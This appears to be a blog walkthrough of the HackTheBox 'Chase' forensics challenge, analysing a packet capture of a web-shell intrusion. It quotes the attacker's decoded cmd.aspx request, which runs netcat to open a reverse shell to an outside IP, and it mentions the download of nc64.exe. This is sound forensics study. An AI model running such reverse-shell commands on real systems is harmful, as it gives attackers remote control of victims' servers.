---
title: "Chase Forensics Challenge"
date: 2021-10-04T17:30:30
categories:
  - challenge
tags:
  - HacktheBox
  - Forensics
classes: wide
---
To diversify my skill-set I have decided to work on CTF style challenges and write about them. The first, a forensics challenge: Chase from [HackTheBox](https://app.hackthebox.eu/challenges/chase)

>*"One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it. We've taken a network capture before shutting the server down to take a clone of the disk. Can you take a look at the PCAP and see if anything is up?"*

This is also a test of adding images to these posts, and doing challenge writeups.

---

First we unzip the file we downloaded from HackTheBox.

<img src="/assets/images/chase/chase1.PNG" alt="Unzipping the challenge files.">

We see that we have a `chase.pcapng` which according to Wireshark's [wiki](https://wiki.wireshark.org/Development/PcapNg) is:

>*"The PCAP Next Generation Dump File Format (or pcapng for short) is an attempt to overcome the limitations of the currently widely used (but limited) libpcap format."*

So it is a packet capture dump file. We'll run `strings chase.pcapng` to see what strings we can read inside first.

<img src="/assets/images/chase/chase2.PNG" alt="Running strings on the file.">

We see web requests and responses, dumped by Wireshark. Looking around more we see:

<img src="/assets/images/chase/chase3.PNG" alt="/cmd.aspx + GET /nc64.exe">

We see the running of a `cmd.aspx` file which according to [fileinfo](https://fileinfo.com/extension/aspx) is:

>*"An ASPX file is an Active Server Page Extended (ASPX) file, which is a webpage generated by web servers running the Microsoft ASP.NET framework. It contains one or more scripts written in VBScript or C# code that are processed by the web server into HTML"*

This combined with `GET /nc64.exe` and the classic python SimpleHTTP server indicates that an attacker is running scripts to open `cmd.exe` and trying to transfer netcat in order to setup a reverse shell.

This is seen further when we url decode:

```
path=c%3A%5Cwindows%5Csystem32%5Ccmd.exe&xcmd=%2Fc+c%3A%5Cusers%5Cpublic%5Cnc.exe+22.22.22.7+4444+-e+cmd.exe&Button=Run
#into
path=c:\windows\system32\cmd.exe&xcmd=/c c:\users\public\nc.exe 22.22.22.7 4444 -e cmd.exe&Button=Run
```

We see they get in and run commands through this section of the pcap:

<img src="/assets/images/chase/chase4.PNG" alt="running whoami and ipconfig">

We open up Wireshark and go through the pcap dump, following the various tcp streams. We see this message on stream 6, and a request for a weird `.txt`.

<img src="/assets/images/chase/chase6.PNG" alt="running whoami and ipconfig">

Running the filename through GCHQ's [cyberchef](https://gchq.github.io/CyberChef/) magic algorithm which :

>*"attempts to detect various properties of the input data and suggests which operations could help to make more sense of it."*

Reveals the following:

<img src="/assets/images/chase/chase7.PNG" alt="Success!">

The flag was encoded in base32, we have successfully captured the flag! 